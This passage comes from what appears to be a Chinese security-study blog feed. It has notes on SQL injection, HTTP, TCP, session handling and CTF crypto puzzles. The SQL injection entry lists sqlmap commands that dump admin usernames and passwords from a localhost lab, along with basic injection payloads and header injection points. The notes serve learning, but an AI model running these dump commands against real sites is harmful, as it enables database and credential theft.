&quot;http://127.0.0.1/sqls/?id=2&quot; --current-db</code></p><p>2、查数据表<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest --tables</code></p><p>3、查数据列<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest -T admin --columns</code></p><p>4、查数据<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest -T admin -C user,pwd --dump</code><br>&#x2F;&#x2F;–后面跟待查内容，current-db整体代表当前数据库，–batch：无交互行为</p><p>NoSQLAttack是一个python编写的专门用于对MongoDB数据库进行SQL注入的渗透测试工具，非常简单好用，并且极大的弥补了sqlmap的不足（sqlmap不能对MongoDB数据库进行渗透）</p><p>相关防注入：<br>自带防御:魔术引号<br>内置函数: int等<br>自定义关键字: select<br>WAF防护软件:安全狗，宝塔</p><p>请求方式request既可以接收get也可以接收post<br><code>get、request、post、cookies、http头部($_SERVER全局变量)、json数据格式请求</code></p><p><a href="https://www.cnblogs.com/wangshuazi/p/9765012.htmlv">$_SERVER用法</a><br>如果使用这个变量接收了用户的信息，并带入数据库查询，就可能存在注入漏洞<br><code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> &#x2F;&#x2F;当前请求的 User_Agent: 头部的内容,注入点在http请求头的User_Agent<br>json就是和参数&#x3D;值的表达类型不一样而已</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=1&#x27; and 1=1 &amp;b=1&amp;c=1</span><br><span class="line">json:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&quot;1 and 1=1&quot;</span><br><span class="line">    &quot;b&quot;:&quot;1&quot;</span><br><span class="line">    &quot;c&quot;:&quot;1&quot;</span><br><span class="line">&#125;    //不用考虑&quot;闭合，要看参数值的类型来猜测需不需要闭合&#x27; &quot;</span><br></pre></td></tr></table></figure><p>SELECT * FROM users WHERE username&#x3D; ‘{$username}’,{是格式，只要闭合’</p><h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><p>注入流程：<br><img src="/img/205.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookies、session、token</title>
      <link href="/cookies%E3%80%81session%E3%80%81token.html"/>
      <url>/cookies%E3%80%81session%E3%80%81token.html</url>
      
        <content type="html"><![CDATA[<p><strong>无状态的HTTP协议</strong><br>很久很久之前， Web基本都是文档的浏览而已。既然是浏览， 作为服务器， 不需要记录在某一段时间里都浏览了什么文档， 每次请求都是一个新的HTTP协议，就是请求加响应。不用记录谁刚刚发了HTTP请求， 每次请求都是全新的。</p><p><strong>如何管理会话</strong><br>随着交互式Web应用的兴起， 像在线购物网站，需要登录的网站等，马上面临一个问题，就是要管理回话，记住那些人登录过系统，哪些人往自己的购物车中放商品，也就是说我必须把每个人区分开。</p><p><strong>cookie</strong><br>cookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据。cookie由服务器生成，发送给浏览器，浏览器把cookie以KV形式存储到某个目录下的文本文件中，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用</p><p><strong>session</strong><br>服务器要知道当前请求发给自己的是谁。为了做这种区分，服务器就是要给每个客户端分配不同的”身份标识”，然后客户端每次向服务器发请求的时候，都带上这个”身份标识“，服务器就知道这个请求来自与谁了。</p><p><strong>Token</strong></p><blockquote><p>1、用户通过用户名和密码发送请求<br>2、程序验证<br>3、程序返回一个签名的token给客户端<br>4、客户端储存token, 并且每次用每次发送请求<br>5、服务端验证Token并返回数据</p></blockquote><p><strong>Cookie和Session的区别</strong></p><blockquote><p>1、存储位置不同： ookie数据存放在客户的浏览器上，session数据放在服务器上<br>2、隐私策略不同：cookie不是很安全， 别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session<br>3、session会在一定时间内保存在服务器上。当访问增多，就会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用cookie<br>4、存储大小不同： 单个cookie保存的数据不能超过4k, 很多浏览器都限制一个站点最多保存20个cookie<br>一般建议： 将登陆信息等重要信息存放为session, 其他信息如果需要保留，可以放在cookie中</p></blockquote><p><strong>Token和Session的区别</strong><br>Session是一种HTTP储存机制， 为无状态的HTTP提供持久机制;<br>Token就是令牌， 比如你授权(登录)一个程序时，它就是个依据，判断你是否已经授权该软件；<br>Session和Token并不矛盾，作为身份认证Token安全性比Session好，因为每一个请求都有签名还能防止监听以及重放攻击，而Session就必须依赖链路层来保障通讯安全了。如上所说，如果你需要实现有状态的回话，仍然可以增加Session来在服务端保存一些状态。</p><p><strong>总结</strong><br>cookie，session，Token没有绝对的好与坏之分，只要还是要结合实际的业务场景和需求来决定采用哪种方式来管理回话，当然也可以三种都用。<br><img src="/./img/3.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>http</title>
      <link href="/http.html"/>
      <url>/http.html</url>
      
        <content type="html"><![CDATA[<p><strong>分层思想</strong><br>每一个环节都是独立的，但是如果上层的环节没有完成就无法进行下一层的工作，在互联网中通信是需要标准的，而这所谓的标准就是协议，双方规定好的，举个例子：双方都使用英语来交流。这些协议很多，规定了每一个环节，但整个流程比较复杂，所以需要分层，变成功能相对单一的子过程</p><ul><li>这样可以使整个流程更加清晰，发杂问题简单化</li><li>更容易发现问题并针对性解决问题</li></ul><h2 id="网络分层模型"><a href="#网络分层模型" class="headerlink" title="网络分层模型"></a>网络分层模型</h2><p><strong>OSI七层模型</strong><br><img src="/./img/190.png"><br>同层使用相同协议，每层都填满了协议，下层为上层提供服务，其中两个重要的协议：TCP协议（传输层）、IP（网络层），后来表示层、会话层、应用层统称应用层，新的架构为了纪念这两个重要的协议，命名为TCP&#x2F;IP五层协议栈</p><h2 id="数据的封装和解封装"><a href="#数据的封装和解封装" class="headerlink" title="数据的封装和解封装"></a>数据的封装和解封装</h2><p>比如说qq软件（应用层）输入hello，传到传输层，然后 </p><h2 id="了解HTTP"><a href="#了解HTTP" class="headerlink" title="了解HTTP"></a>了解HTTP</h2><p>HTTP（Hypertext Transfer Protocol），超文本传输协议，指的是在计算机世界中专门在两点之间传输超文本数据的规范。</p><p>超文本指的是现在计算机可以传输文字、图片、音频、视频，甚至点击文字或图片能够进行超链接的跳转，文本的语义被扩大化，因此被称为超文本。</p><p>传输指的是由传输载体负责把二进制数据包由计算机终端传输到另一个终端的过程。通常我们把传输数据包的一方称为请求方，把接到二进制数据包的一方称为应答方。请求方和应答方可以进行互换，请求方也可以作为应答方接受数据，应答方也可以作为请求方请求数据。</p><p>网络协议指的是网络中（包括互联网）传递、管理信息的一些规范。ftp、http、ftmp、pop、tcp&#x2F;ip这些都是网络协议。</p><p><strong>网络模型</strong><br>为了给网络协议设计结构，设计者以分层的方式设计组织网络协议，每个协议属于层次模型之一，且每一层都向其上一层提供服务。每个分层中所有协议被称为协议栈，因特网协议栈分为五个部分：物理层、链路层、网络层、运输层和应用层。</p><p><strong>应用层</strong><br>应用层是网络应用程序和网络协议存放的分层。应用层协议分布在多个端系统上一个端系统应用程序与另外一个端系统应用程序交换信息分组，我们把位于应用层的信息分组称为报文(message)。常用的HTTP协议、FTP协议等等都在这一层中。</p><p><strong>常见的应用层协议</strong></p><blockquote><p>1、DNS（域名系统）<br>DNS 是互联网使用的命名系统，用来把人们使用的机器名字（域名）转换为 IP 地址<br>2、FTP（文件传输协议）<br>FTP 是使用得最广泛的文件传送协议<br>3、Telnet（远程终端协议）<br>Telnet 是一个简单的远程终端协议，结合端口使用，常用于服务探测<br>4. HTTP（超文本传送协议）<br>HTTP 是面向事务的应用层协议，它是互联网能够可靠地交换文件的重要基础。http 使用面向连接的 TCP 作为运输层协议，保证了数据的可靠性。<br>5、SMTP（电子邮件协议）<br>SMTP 是简单邮件传送协议。SMTP规定了在两个相互通信的 SMTP 进程之间应如何交换信息。SMTP通信包括三个阶段，分别是：建立连接、邮件传送、连接释放。<br>6、POP3（邮件读取协议）<br>POP3，全称是 Post Office Protocol 3，该协议通常被用来接收电子邮件<br>7. SNMP（简单网络管理协议）<br>SNMP 协议由三部分组成，包括：SNMP本身、管理信息结构 SMI 和管理信息 MIB。SNMP 定义了管理站和代理之间所交换的分组格式。SMI 定义了命名对象类型的通用规则，以及把对象和对象的值进行编码。MIB 在被管理的实体中创建了命名对象，并规定类型。<br>8、TFTP（简单文件传送协议）<br>TFTP是TCP&#x2F;IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，它基于UDP协议而实现的，提供不复杂、开销不大的文件传输服务。默认端口号是 69。</p></blockquote><p>除了上面介绍的协议外，其他应用层协议还有 DHCP、Gopher 、IMAP4、IRC、 NNTP、 XMPP、 SIP、 SSH、 RPC、 RTCP、 RTP、RTSP、SDP、 SOAP、 GTP、 STUN、 NTP、SSDP、 BGP 等</p><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>当你在Web浏览器中输入一个URL时，浏览器将根据你的要求创建并发送请求，该请求包含所输入的URL以及一些与浏览器本身相关的信息。当服务器收到这个请求时将返回一个响应，该响应包括与该请求相关的信息以及位于指定URL（如果有的话）的数据。直到浏览器解析该响应并显示出网页（或其他资源）为止。</p><p><strong>HTTP请求</strong><br>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;request-line&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line">&lt;blank line&gt;</span><br><span class="line">[&lt;request-body&gt;]</span><br></pre></td></tr></table></figure><p>格式说明：</p><ul><li>第一行必须是一个请求行(request-line),用来说明请求方法,要访问的资源(URL<br>的一部分)以及所使用的HTTP版本</li><li>请求头部信息,用来说明服务器要使用的附加信息，key：value</li><li>空行(一定要有)</li><li>请求主体信息</li></ul><p><strong>Get：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Host: www.google.cn</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">&lt;空行&gt;</span><br></pre></td></tr></table></figure><p><strong>说明:</strong></p><ul><li>第一部分说明了该请求是一个GET请求.该行的第二部分是一个斜杠(&#x2F;),用来说明请求的是该域名的根目录.该行的最后一部分说明使用的是HTTP1.1版本(另一个可选荐是1.0)</li><li>请求头部信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- HOST将指出请求的目的地.</span><br><span class="line">- User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送.</span><br><span class="line">- Connection,通常将浏览器操作设置为Keep-Alive</span><br></pre></td></tr></table></figure></li><li>第三部分,空行,即使不存在请求主体,这个空行也是必需的</li></ul><p><strong>Post</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line">Host:www.wrox.com</span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure><p><strong>说明:</strong></p><ul><li>请求行开始处的GET改为POST,以表示不同的请求方式</li><li>Content-Type说明了请求主体的内容是如何编码的.浏览器始终以application&#x2F;x-www-form-urlencoded的格式编码来传送数据,这是针对简单URL编码的MIME类型</li><li>Content-Length说明了请求主体的字节数</li><li>最后请求主体.名称-值对的形式</li></ul><h2 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h2><p><strong>格式：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;status-line&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line">&lt;blank line&gt;</span><br><span class="line">[&lt;response-body&gt;]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li>状态行：协议版本 状态码 状态文字</li><li>消息报头 key：value</li><li>空行(一定要有)</li><li>响应主体信息</li></ul><p><strong>案例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 31 Dec 2005 23:59:59 GMT</span><br><span class="line">Content-Type: text/html;charset=ISO-8859-1</span><br><span class="line">Content-Length: 122</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Wrox Homepage&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;!-- body goes here --&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在响应中唯一真正的区别在于第一行中用状态信息代替了请求信息。状态行（status line）通过提供一个状态码来说明所请求的资源情况。最常用的状态码有：<br>200 OK      &#x2F;&#x2F;客户端请求成功<br>400 Bad Request  &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden  &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务<br>404 Not Found  &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误<br>503 Server Unavailable  &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><strong>http:\host[:port][abs_path][?query]#fragment</strong><br>协议：告诉浏览器使用何种协议，常用的是http协议或https协议<br>主机（host）：域名或ip，指示需要向网络上哪一台发起请求<br>端口（port）：表示用于访问WEB服务器上资源的入口，如果访问的该 Web 服务器使用HTTP协议的标准端口（HTTP为80，HTTPS为443）授予对其资源的访问权限，则通常省略此部分。<br>路径（abs_path）：web服务器上资源的路径，以端口后第一个&#x2F;开始，到?结束<br>查询参数（query）：提供给web服务器的额外参数，如果为GET请求一般URL带有查询参数<br>锚点（fragment）：给予浏览器显示位于该点的内容的指示，其片段标识符不会与请求一起发送到服务器</p><h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><ul><li>Host：表示对象所在主机，指明了服务器的域名，以及（可选的）服务器监听的TCP端口号。如果没有给定端口号，会自动使用被请求服务的默认端口</li><li>Connection： 决定当前事务（一次三次握手和四次挥手）完成后，是否会关闭网络连接。若为持久性连接（keep-alive）则事务完成后不关闭网络连接，反之为非持久性连接（close），一次事务完成后关闭网络连接。</li><li>User-agent: 请求头用来告诉 Web 服务器，浏览器使用的类型</li><li>Date：表示请求时的格林威治时间</li><li>Content-Length：实体报头指示实体主体的大小，以字节为单位，发送到接收方。</li><li>HTTP Referer 属性是请求标头的一部分，当浏览器向 web 服务器发送请求的时候，一般会Referer：告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</li><li>Upgrade-Insecure-Requests：用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应。</li><li>Accept：接受请求 HTTP 标头会通告客户端其能够理解的 MIME 类型。<br>文本文件： text&#x2F;html、text&#x2F;plain、text&#x2F;css、application&#x2F;xhtml+xml、application&#x2F;xml<br>图片文件： image&#x2F;jpeg、image&#x2F;gif、image&#x2F;png<br>视频文件： video&#x2F;mpeg、video&#x2F;quicktime<br>应用程序二进制文件： application&#x2F;octet-stream、application&#x2F;zip</li></ul><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>2xx：成功响应</p><ul><li>200 成功响应</li><li>204 请求处理成功，但是没有资源可以返回</li><li>206 对资源某一部分进行响应，由Content-Range 指定范围的实体内容。</li></ul><p>3xx：需要进行附加操作以完成请求</p><ul><li>301 永久性重定向，该状态码表示请求的资源已经重新分配 URI，以后应该使用资源现有的 URI</li><li>302 临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。</li><li>303 该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。</li><li>304 该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。</li><li>307 临时重定向。该状态码与 302 Found 有着相同的含义。</li></ul><p>4xx：客户端发生错误</p><ul><li>400 该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。</li><li>401 该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</li><li>403 该状态码表明对请求资源的访问被服务器拒绝了。</li><li>404 该状态码表明服务器上无法找到请求的资源。</li></ul><p>5xx：服务器本身发生错误</p><ul><li>500 该状态码表明服务器端在执行请求时发生了错误。</li><li>503 该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</li></ul><h2 id="常用其他协议介绍"><a href="#常用其他协议介绍" class="headerlink" title="常用其他协议介绍"></a>常用其他协议介绍</h2><p><strong>DNS</strong><br>计算机网络中的每个端系统都有一个IP地址存在，而把IP地址转换为便于人类记忆的协议就是 DNS 协议。DNS 的全称是域名系统，它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p><strong>HTTPS</strong><br>HTTP 一般是明文传输，很容易被攻击者窃取重要信息，鉴于此，HTTPS 应运而生。HTTPS和HTTP有很大的不同在于HTTPS是以安全为目标的HTTP通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS在HTTP的基础上增加了SSL层，也就是说<code>HTTPS = HTTP + SSL</code>。</p><p><strong>TCP&#x2F;IP</strong><br>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议</p><h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p>为了给网络协议设计结构，设计者以分层的方式设计组织网络协议，每个协议属于层次模型之一，且每一层都向其上一层提供服务。每个分层中所有协议被称为协议栈，因特网协议栈分为五个部分：物理层、链路层、网络层、运输层和应用层。</p><h3 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h3><p>运输层在应用程序断点之间传送应用程序报文。这一层中主要用到的是TCP协议与UDP协议，我们把运输层的分组称为报文段(segment)。</p><ul><li>TCP是面向连接的、可靠的流协议。流就是指不间断的数据结构，当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端。</li><li>UDP是不具有可靠性的数据报协议。细微的处理它会交给上层的应用去完成。在UDP的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。</li></ul><h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><p>而要建立TCP&#x2F;IP连接，就需要三次握手进行初始化</p><blockquote><p>第一次握手：客户端发送一个TCP标志位SYN&#x3D;1，ACK&#x3D;0的数据包给服务端，并随机会产生一个Seq&#x3D;J.当服务端接收到这个数据后，服务端由SYN&#x3D;1可知客户端是想要建立连接；<br>第二次握手：服务端要对客户端的联机请求进行确认，向客户端发送应答号ACK&#x3D;1、SYN&#x3D;1、确认号Ack&#x3D;J+1，此值是客户端的序列号加1，还会产生一个随机的序列号Seq&#x3D;K，这样就告诉客户端可以进行连接；<br>第三次握手：客户端收到数据后检查Ack是否为J+1，以及标志位ACK的值是否为1，若为1，则会发送ACK&#x3D;1、确认号码Ack&#x3D;K+1，告诉服务端,你的请求连接被确认，连接可以建立，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</p></blockquote><p>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误<br>三次握手是在安全可靠的基础上，握手次数最少的方案。两次握手并不能保证可靠性，四次握手又浪费了效率。当然，有的需要更高安全性的地方，是可以有N次握手协议的，但那是特殊情况。</p><h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。在socket编程中，这一过程由客户端或服务端任一方执行close来触发。</p><blockquote><p>第一次挥手：客户端发送一个FIN&#x3D;M，用来关闭客户端到服务器端的数据传送，客户端进入FIN_WAIT_1状态。意思是说”我客户端没有数据要发给你了”，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。<br>第二次挥手：服务器端收到FIN后，先发送ack&#x3D;M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入FIN_WAIT_2 状态，继续等待服务器端的FIN报文。<br>第三次挥手：当服务器端确定数据已发送完成，则向客户端发送FIN&#x3D;N报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入LAST_ACK状态。<br>第四次挥手：客户端收到FIN&#x3D;N报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送ack&#x3D;N+1后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。服务器端收到ACK后，就知道可以断开连接了。客户端等待了2MSL后依然没有收到回复，则证明服务器端已正常关闭，这时客户端也关闭连接。最终完成了四次握手。</p></blockquote><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>普通的TCP通信无法保证数据的安全，它随时可能被第三方截获而泄漏通信双方之间的隐私，这显然是我们不希望看到的，尤其在跟用户名、密码、个人信息息息相关的通信过程（如网上银行交易、机密文件传输等等）尤其看重数据交互的隐秘性，所以我们常常用SSL协议来建立安全保密的通信，SSL协议能够保证交互双方的数据按密文方式传输，第三方在没有私钥的情况下几乎无法破解，从而到达保密的目的<br><a href="https://blog.csdn.net/volcan1987/article/details/8996220">SSL交互(握手)过程详解</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto</title>
      <link href="/Crypto.html"/>
      <url>/Crypto.html</url>
      
        <content type="html"><![CDATA[<ul><li>ROT13编码<br>ROT13(有时中间加了个连字符称作ROT-13) 是一种简易的替换式密码,凯撒加密的一种变体</li><li>摩斯密码<br>摩斯电码定义了包括：英文字母A-Z（大写）十进制数字0-9，以及简单的标点符号？ &#x2F; ）－ ． </li><li>quoted-printable编码用于将非 ASCII 字符转换为 ASCII 字符，以便在电子邮件等文本传输中使用。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure></li><li>Rabbit 开头部分通常为U2FsdGVkX1<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure></li><li>栅栏密码:所谓栅栏密码，就是把明文分成N个组，然后取出每组的第一个，每组的第二个。。接着按顺序排列得出密文<br>题目：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一只小羊跳过了栅栏，两只小样跳过了栅栏，一坨小羊跳过了栅栏…</span><br><span class="line">tn c0afsiwal kes,hwit1r g,npt ttessfu&#125;ua u hmqik e &#123;m, n huiouosarwCniibecesnren</span><br></pre></td></tr></table></figure>思路：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于题中提到了栅栏，于是猜这段字符串使用了栅栏密码，去掉空格后一数发现字符串长度为71，因为71是一个素数，所以无法对其进行各很好的分组，所以猜测空格可能是计数的，再看字符串中有些字母中间空格不止一个，就更加肯定空格是计数的了，于是加上空格，字符串长度为85，而85的因子有5和17，于是乎我们就可以按5个一组或17个一组去试</span><br></pre></td></tr></table></figure></li></ul><h2 id="buuctf-变异凯撒"><a href="#buuctf-变异凯撒" class="headerlink" title="buuctf 变异凯撒"></a>buuctf 变异凯撒</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line">str2 = list(str1)</span><br><span class="line">str3 = &#x27;&#x27;</span><br><span class="line">num = len(str2)</span><br><span class="line">for i in range(0, num):</span><br><span class="line">    str3 = str3 + chr(ord(str2[i]) + 5 + i)</span><br><span class="line">print(str3)</span><br></pre></td></tr></table></figure><p>同余的一些性质<br><img src="/./img/137.png"></p><p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><p>gmpy2.invert(a, n)<br>找出一个数b，使a * b 除以 n 的余数等于 1<br>101999966233<br>flag{d450209323a847c8d01c6be47c81811a}<br>在线素数分解因数<br>wget <a href="https://www.mpfr.org/mpfr-current/mpfr-4.2.1.tar.xz">https://www.mpfr.org/mpfr-current/mpfr-4.2.1.tar.xz</a><br>tar -jxvf mpfr-4.2.1.tar.bz2 &amp;&amp; cd mpfr-4.2.1</p><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。</span><br><span class="line">以下密文被解开后可以获得一个有意义的单词：FRPHEVGL</span><br><span class="line">你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交</span><br></pre></td></tr></table></figure><p>猜出是凯撒密码，26种情况都尝试一下，发现在13位时是security，有意义的单词，所以猜测这是正确的偏移量，将给出的密文按13位解密就行</p><p>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>用户名（Username）: 这是用户的登录名。<br>用户ID（User ID）: 这是用户在系统中的唯一标识符。<br>散列密码（Hashed Password）: 这是用户密码的散列值，而不是明文密码。散列密码通常用于安全存储用户密码，以防止明文密码泄漏。<br>附加信息（Additional Information）: 这个字段可能包含用户的其他信息，但在提供的示例中为空。<br>散列密码都是经过处理的，无法直接从中获取原始密码。这是因为Windows通常会将密码进行哈希处理，以增强安全性。哈希是一种单向函数，它将输入转换为固定长度的字符串，使得很难从哈希值还原出原始输入。这有助于保护用户密码免受未经授权的访问<br>用户名：ctf  用户ID：1002 散列密码：06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鲲鹏杯</title>
      <link href="/%E9%B2%B2%E9%B9%8F%E6%9D%AF.html"/>
      <url>/%E9%B2%B2%E9%B9%8F%E6%9D%AF.html</url>
      
